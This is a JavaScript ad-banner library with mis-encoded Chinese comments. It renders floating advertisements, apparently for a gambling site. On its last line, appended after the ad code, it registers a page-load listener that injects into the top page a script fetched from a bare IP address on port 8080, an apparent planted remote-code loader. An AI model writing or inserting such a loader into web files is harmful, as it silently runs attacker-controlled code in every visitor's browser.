/**
 * @author xujun
 **/




/**
 * ���²�����ϵͳ����ʱ����ر�ע�⣡
 **/
//�ز��ļ���·��������ͼƬFLASH�ĵط�
//var	IM_AD_ROOT_PATH="http://192.9.150.70/images/upload/";
var	IM_AD_ROOT_PATH="";
//var	IM_AD_ROOT_PATH="http://61.130.8.218/images/upload/";

//����ز�����·�������ǵ���¼���������
var	IM_AD_link="";
//���ù��λ���ݵ�JSĿ¼����ЩJS���ɹ��ϵͳ�Զ����ɵ�
//var	AD_JS_ROOT_PATH="http://192.9.150.70/js/cachejs/";
var	AD_JS_ROOT_PATH="";
//var	AD_JS_ROOT_PATH="http://61.130.8.218/js/cachejs/";





//��json_edit.js�ļ����к󱸷�������·��Ҫ���ã���Ҫ����

/**
 * ���²�����ϵͳ����ʱ�ɲ�����Ƽ����ϣ��Է�����
 **/
//�زĳ���ʱ��ʾ��·��
var ERROR_IMG_DEFAULT_PATH="";  

//����˵��δ�趨����ʱ��ʾ������
var ERROR_TEXT_DEFAULT_CONTENT="���λ";



//��������Ϣ
/**
 * ����һ��������Ϣ
 * @param	adUrl		���ĵ�ַ
 * @param	adLink	  ����������ӵ�ַ
 * @param	adText	 �������
 * @param	keyWord		�ؼ���
 * @param	opener		���رհ�ť��-1Ϊ�ر�״̬��������Ϊ��
 **/
function ImAd( adUrl, adLink, adText ,keyWord, opener){
		this.adUrl	=	adUrl;
		this.link	=	adLink;
		this.adText	=	adText;
		this.keyWord	=	keyWord;
		this.opener	=	opener;
			
		if (this.adUrl == undefined || this.adUrl ==""){
			this.adUrl = ERROR_IMG_DEFAULT_PATH
		}else{
			this.adUrl = IM_AD_ROOT_PATH	+  this.adUrl
		 }
		if (this.link == undefined){
			this.link = ERROR_IMG_DEFAULT_LINK
		}
		if (this.adText == undefined || this.adText ==""){
			this.adText = ERROR_TEXT_DEFAULT_CONTENT
		}
		if (this.keyWord == undefined || this.keyWord ==""){
			this.keyWord = "hiywefqehrbdefgrrbiadungqewribgqwrebgqrouhtqwrgfdfdfg"
		}				
		if (this.link != ""){
		this.link	=	IM_AD_link	+ this.link
		}				

}


//������λ
/**
 * ����һ�����λ
 * @param	adType	 �������0 ->	flash	 1-> ͼƬ���λ	 2 ->	���������λ 3 ->�õ�Ƭ��� 4->����ҳ��� 5->���Ĺ��  6->Ư�����  7->ȫ�����  8 ->�ֲ����  9 ->FLASH�õ�Ƭ���   10 ->��Ͷ���   11 ->��Ƶ���(���������ļ�·��Ҫ�����·��)   12 ->�����ʾ���   13 ->�ڿ���
 * @param	arrImAd	 �ù��λ������ʾ�����й��
 * @param	height	 ͼƬ�ĸ߶�
 * @param	width	 ͼƬ�Ŀ��
 * @param	para	 �õ�Ƭ����ʱ�䡢ȫ������ʱ�䡢���Ĺ������������div��id����ΧԽСԽ�ã���Χ�����������
 * @param adIndexX   ������λ�ã�ע�����ַ������͵Ķ��Ҳ�Ҫ���ո񣬸�����ʾ��������Ŀ��
 * @param adIndexY   �������λ�ã�ע��û�и���
 **/
function ImAdcolumn( adType, arrImAd, width, height, para, adIndexX, adIndexY){
		//�������
		this.adType = adType;
    // �����ŵĶ�����ImAd
    this.arrImAd = arrImAd;
    // �߶�
    this.height = height;
    // ���
    this.width = width;
    // ������    
    this.para = para;
    //���adIndexXΪ���������ʾ�����������ֵ
		this.adIndexX	=	adIndexX;
		this.adIndexY	=	adIndexY;		      

		if (this.adType == undefined || this.adType ==""){
			this.adType = 1
		}
		if (this.arrImAd == undefined || this.arrImAd =="" || this.arrImAd.length == 0){
			this.arrImAd = new ImAd("","","","")
		}
		if (this.height == undefined || this.height ==""){
			this.height = 100
		}
		if (this.width == undefined || this.width ==""){
			this.width = 100
		}
		if (this.para == undefined || this.para ==""){
			this.para = ""
		}
		if (this.adUrl == undefined || this.adUrl ==""){
			this.adUrl = ERROR_IMG_DEFAULT_PATH
		}
		if (this.adUrl == undefined || this.adUrl ==""){
			this.adUrl = ERROR_IMG_DEFAULT_PATH
		}				
    		
		if (this.adIndexX==undefined || typeof(this.adIndexX)!='string' || this.adIndexX ==""){
			this.adIndexX = "100"
		}

		if (this.adIndexY==undefined || this.adIndexY ==""){
			this.adIndexY = "100"
		}				



    /**
     * �ѹ��λ������
     **/
    this.draw = function() {
        // ��div��
        var imAd= this.arrImAd[0];
        // �����flash�Ļ�
        if ( this.adType == 0 ) {
            this.drawFlash(imAd);
        } else if( this.adType == 1 ) {
            this.drawPic(imAd);
        } else if ( this.adType == 2 ) {
            this.drawTextLink(imAd);
        } else if ( this.adType == 3 ) {
            this.drawSlide(arrImAd);
        } else if ( this.adType == 4 ) {
            this.drawWin(imAd);
        } else if ( this.adType == 5 ) {
            this.drawKey(arrImAd);
        } else if ( this.adType == 6 ) {
            this.drawFloat(imAd);
        } else if ( this.adType == 7 ) {
            this.drawBackPic(imAd);
        } else if ( this.adType == 8 ) {
            this.drawSlideR2(arrImAd);
        } else if ( this.adType == 9 ) {
            this.drawSlideFlash(arrImAd);
        } else if ( this.adType == 10 ) {
            this.drawBehindAll(imAd);
        } else if ( this.adType == 11 ) {
            this.drawFlv(imAd);
        } else if ( this.adType == 12 ) {
            this.drawRandom(arrImAd);
        } else if ( this.adType == 13 ) {
            this.drawIframe(imAd);
        }
		
    }
    
    
	
    
    
    /**
     * ��Ư�����
     * @param imAd �����Ϣ
     **/
    this.drawFloat = function(imAd){
    	  //�رհ�ť
      	if(-1 == imAd.opener){return}
      	    	
    		var temple = this.randomChar(10);
    		var stringtext = "";
    		var x = this.adIndexX;
    		var y = this.adIndexY;
				if (x.indexOf("-")==0){
					x = "right:" + x.slice(1) + "px;";
				}else{
					x = "left:" + x + "px;";
				}
				if (y.indexOf("-")==0){
					z = "_top:expression(eval(document.compatMode && document.compatMode==\'CSS1Compat\') ?  documentElement.scrollTop + (document.documentElement.clientHeight-this.offsetHeight"+y+") : document.body.scrollTop + (document.body.clientHeight - this.clientHeight"+y+"));";
					y = "bottom:" + y.slice(1) + "px;";
				}else{
					z = "_top:expression(eval(document.compatMode && document.compatMode==\'CSS1Compat\') ?  documentElement.scrollTop +"+y+" : document.body.scrollTop+"+y+");";
					y = "top:" + y + "px;";
				}
	  		
		stringtext += '<div id="' + temple + '" style="clear:both;z-index:999;' + x + y + 'position:fixed!important;position:absolute;' + z + '">';
		if (imAd.adUrl.slice(-4)==".swf"){				
			stringtext +='<div style="position:relative; left:0;top:0;">'; 
			stringtext +='<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="' + this.width + '" height="' + this.height + '">';
			stringtext +='  <param name="movie" value="' + imAd.adUrl + '" />';
			stringtext +='  <param name="quality" value="high" />';
			stringtext +='  <param name="wmode" value="transparent">';
			stringtext +='  <embed src="' + imAd.adUrl + '" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="' + this.width + '" height="' + this.height + '"></embed>';
			stringtext +='</object>';

			// ��������ӵĻ�
			if( imAd.link ) {
				stringtext +='	<div style="position:absolute; left:0;top:0;">'; 
				stringtext +='		<table width="'+ this.width +'" height="' + this.height + '" border="0" cellspacing="0"  onclick="window.open(\''+ imAd.link +'\');" style="cursor:pointer" cellpadding="0">'; 
				stringtext +='		  <tr><td>��</td></tr>'; 
				stringtext +='		</table>'; 
				stringtext +='	</div>'; 
			}
			stringtext +='</div>';	

		} else {
			// ��������ӵĻ�
			if( imAd.link ) {
						stringtext +="<a target=_blank href=" + imAd.link + "><img width=" + this.width + " height=" + this.height + " border=0 src=" + imAd.adUrl + "></a><br>";
			}else {				
					stringtext +="<img width=" + this.width + " height=" + this.height + " border=0 src=" + imAd.adUrl + "><br>";
			}
		}
		stringtext +="<div align=left onclick=\"javascript:document.getElementById('" + temple +"').style.display='none';\" style=\"font-size:12px;color:#000000;padding-top:3px;cursor:pointer;letter-spacing:4px;padding-right:6px;padding-left:6px;\" ></div>";
		
		stringtext +="</div>";
		document.write(stringtext);
	} 
    		










    /**
     * ��������ַ���
     * @param l λ��     
     * @return ���ɵ�����ַ���
     **/    
    this.randomChar = function(l) {
    	var   x="erfqwertyuioplkjhgfdsazxcvbnm";
    	var   tmp="";
    	for(var   i=0;i<l;i++)   {
    		tmp   +=   x.charAt(Math.ceil(Math.random()*100000000)%x.length);
    	}
    	return   tmp;
    }


    /**
     * ��ȡcookieֵ
     * @param Name ����     
     * @return ��ȡ��ֵ
     **/ 
	this.get_cookie = function(Name) {    
		var search = Name + "=";    
		var returnvalue = "";     
		if (document.cookie.length > 0) {     
			offset = document.cookie.indexOf(search);     
			if (offset != -1) {     
				offset += search.length;     
				end = document.cookie.indexOf(";", offset);     
				if (end == -1){     
					end = document.cookie.length;
				}
				returnvalue=unescape(document.cookie.substring(offset, end));     
			}     
		}     
		return returnvalue;     
	}	

}
 
var jsonObject=["6",[["/�Ͼ�����.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","2","42"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}

var jsonObject=["6",[["/�Ͼ�����.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","-2","42"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}

var jsonObject=["6",[["/�Ͼ�����.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","2","322"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}

var jsonObject=["6",[["/�Ͼ�����.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","-2","322"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}
;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://119.4.249.166:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);